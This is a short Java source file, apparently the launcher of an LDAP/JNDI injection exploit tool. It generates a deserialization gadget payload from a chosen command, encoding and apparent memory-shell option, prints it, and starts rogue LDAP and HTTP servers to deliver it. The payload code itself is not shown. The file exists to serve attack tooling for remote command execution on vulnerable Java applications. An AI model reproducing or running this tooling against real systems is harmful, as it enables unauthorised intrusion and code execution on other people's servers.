package com.idiot9.ldap;

import com.idiot9.ldap.gadgets.GadgetFactory;
import com.idiot9.ldap.utils.Config;
import com.idiot9.ldap.utils.EncodeFactory;
import com.idiot9.ldap.utils.PayloadGenerator;

public class Starter {
    public static void main(String[] args) throws Exception {
        args = new String[]{"-i", "127.0.0.1"};
        Config.applyArgs(args);

        String s = PayloadGenerator.generatePayload(Config.gadget, Config.cmd, Config.encode, Config.mem, Config.password);
        System.out.println(s);

        if (Config.ip != null) {
            LdapServer.start();
            HTTPServer.start();
        }
    }
}
